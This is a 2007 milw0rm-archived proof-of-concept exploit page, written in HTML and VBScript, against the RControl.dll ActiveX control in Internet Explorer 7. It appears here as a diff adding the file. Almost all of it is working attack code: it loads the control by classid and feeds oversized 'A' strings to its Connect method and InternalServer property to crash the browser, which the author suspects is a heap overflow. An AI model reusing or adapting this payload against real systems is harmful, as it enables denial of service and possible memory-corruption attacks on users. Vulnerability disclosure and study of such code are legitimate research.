@@ -1,0 +1,56 @@
+<span style="font: 14pt Courier New;"><p align="center"><b>2007/05/10</b></p></span>
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-----------------------------------------------------------------------------
+ <b>RControl.dll v. 1.2.1.0 Denial of Service Exploit</b>
+ url: http://www.fruit2004.com/
+ price: only $20 :)
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+ If you try less than 4000 chr you'll see a strange crash. It seems like a
+ heap overflow in ntdll.dll but I'm really not sure of this thing :)
+-----------------------------------------------------------------------------
+
+<object classid='clsid:2A515FCD-C0E9-4F38-9C77-2949514366F2' id='target' style="width: 405px; height: 50px"></object>
+
+<select style="width: 404px" name="Pucca">
+  <option value = "Connect">Connect</option>
+  <option value = "InternalServer">InternalServer</option>
+
+  <option value = "Quoting">Quoting...</option>
+</select>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+Sub tryMe
+  on error resume next
+   Dim MyMsg
+   if Pucca.value = "Connect" then
+     argCount = 5
+     arg1=String(8001,"A")
+     arg2=1
+     arg3="default"
+     arg4="default"
+     arg5="default"
+     target.connect arg1, arg2, arg3, arg4, arg5
+   elseif Pucca.value = "InternalServer" then
+     argCount = 1
+     arg1=String(1000000, "A")
+     target.InternalServer = arg1
+   else
+     MyMsg = MsgBox ("He turned around to face his mother" & vbCrLf & _
+                     "To show her the wound in his breast" & vbCrLf &_
+                     "That burned like a brand" & vbCrLf & _
+                     "But the sword that cut him open" & vbCrLf & _
+                     "Was the sword in his mother's hand", 64, "2007/05/10 - RControl 1.2")
+   end if
+ End Sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-05-10]
